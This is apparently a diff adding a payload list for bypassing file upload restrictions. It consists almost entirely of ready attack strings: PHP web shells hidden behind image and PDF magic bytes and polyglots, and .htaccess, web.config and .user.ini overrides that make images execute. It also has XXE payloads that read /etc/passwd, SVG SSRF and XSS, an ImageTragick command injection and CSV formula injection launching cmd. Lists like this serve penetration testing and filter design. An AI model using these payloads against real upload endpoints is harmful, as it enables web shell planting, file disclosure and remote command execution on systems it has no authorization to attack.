@@ -1,0 +1,254 @@
+# File Upload Bypass Payloads
+# Techniques to bypass file upload restrictions and WAF filters
+
+# Extension Bypasses
+# Double Extensions
+shell.php.jpg
+shell.php.png
+shell.php.gif
+shell.php.pdf
+shell.php.txt
+shell.asp.jpg
+shell.aspx.png
+shell.jsp.gif
+
+# Null Byte Injection
+shell.php%00.jpg
+shell.php%00.png
+shell.php\x00.jpg
+shell.asp%00.txt
+
+# Case Manipulation
+shell.PhP
+shell.pHp
+shell.PHP
+shell.AsP
+shell.AsPx
+shell.JsP
+
+# Special Characters
+shell.php....
+shell.php.....
+shell.php::$DATA
+shell.php::$INDEX_ALLOCATION
+shell.php:.jpg
+shell.php .jpg
+shell.php. .jpg
+
+# Unicode/UTF-8
+shell.ph%70
+shell.%70hp
+shell.p%68p
+shell.php%E2%80%AE.jpg
+
+# Alternative Extensions
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phtml
+shell.pht
+shell.phps
+shell.phar
+shell.phpt
+shell.pgif
+shell.pjpg
+shell.shtml
+shell.shtm
+shell.inc
+shell.hphp
+shell.ctp
+
+# ASP Alternatives
+shell.asp
+shell.aspx
+shell.cer
+shell.asa
+shell.cdx
+shell.ashx
+shell.asmx
+shell.rem
+
+# JSP Alternatives
+shell.jsp
+shell.jspx
+shell.jsw
+shell.jsv
+shell.jspf
+
+# Perl Alternatives
+shell.pl
+shell.pm
+shell.cgi
+shell.lib
+
+# Python Alternatives
+shell.py
+shell.pyc
+shell.pyo
+shell.pyw
+
+# Content-Type Bypasses
+Content-Type: image/jpeg (with PHP shell)
+Content-Type: image/png (with PHP shell)
+Content-Type: image/gif (with PHP shell)
+Content-Type: text/plain (with PHP shell)
+Content-Type: application/octet-stream (with PHP shell)
+
+# Magic Bytes Bypasses
+# GIF89a header + PHP shell
+GIF89a<?php system($_GET['cmd']); ?>
+
+# PNG header + PHP shell
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+
+# JPEG header + PHP shell
+\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
+
+# PDF header + PHP shell
+%PDF-1.4<?php system($_GET['cmd']); ?>
+
+# Polyglot Files
+# GIF/PHP polyglot
+GIF89a;<?php system($_GET['cmd']); __halt_compiler();?>
+
+# JPEG/PHP polyglot
+\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET['cmd']); __halt_compiler();?>
+
+# ZIP/PHP polyglot
+PK\x03\x04<?php system($_GET['cmd']); __halt_compiler();?>
+
+# Filename Bypasses
+# Path Traversal in Filename
+../../shell.php
+..\..\shell.php
+....//....//shell.php
+
+# Long Filename
+shell.php + (A * 5000) + .jpg
+
+# Special Filenames
+.htaccess
+web.config
+.user.ini
+php.ini
+.bashrc
+.bash_profile
+
+# MIME Type Bypasses
+image/jpeg
+image/png
+image/gif
+text/plain
+application/octet-stream
+multipart/form-data
+
+# Archive Bypasses
+# ZIP with PHP
+shell.zip (contains shell.php)
+
+# TAR with PHP
+shell.tar (contains shell.php)
+
+# RAR with PHP
+shell.rar (contains shell.php)
+
+# 7z with PHP
+shell.7z (contains shell.php)
+
+# .htaccess Upload
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .gif
+
+# web.config Upload
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers>
+         <add name="PHP_via_FastCGI" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" />
+      </handlers>
+   </system.webServer>
+</configuration>
+
+# .user.ini Upload
+auto_prepend_file=shell.jpg
+
+# SVG with XSS/XXE
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <script type="text/javascript">alert('XSS')</script>
+</svg>
+
+# Image with EXIF PHP
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+
+# Filename Encoding
+shell%2Ephp
+shell%252Ephp
+shell.php%20
+shell.php%09
+shell.php%0a
+shell.php%0d
+
+# Directory Traversal
+../shell.php
+..%2Fshell.php
+..%252Fshell.php
+..%5Cshell.php
+
+# Race Condition
+# Upload file, access before validation completes
+# Requires timing attack
+
+# Zip Slip
+../../shell.php (inside ZIP)
+..\..\shell.php (inside ZIP)
+
+# ImageTragick (CVE-2016-3714)
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|ls "-la)'
+pop graphic-context
+
+# XXE in SVG
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+# SSRF in SVG
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg">
+  <image height="100" width="100" xlink:href="http://internal-server/admin" />
+</svg>
+
+# PDF with JavaScript
+%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Outlines 2 0 R
+/Pages 3 0 R
+/OpenAction << /S /JavaScript /JS (app.alert('XSS');) >>
+>>
+endobj
+
+# Office Document Macros
+# .docm, .xlsm, .pptm with malicious macros
+
+# HTML Upload (for XSS)
+<html><body><script>alert('XSS')</script></body></html>
+
+# CSV Injection
+=cmd|'/c calc'!A1
+@SUM(1+1)*cmd|'/c calc'!A1
++cmd|'/c calc'!A1
+-cmd|'/c calc'!A1
+
+# XML Upload (for XXE)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
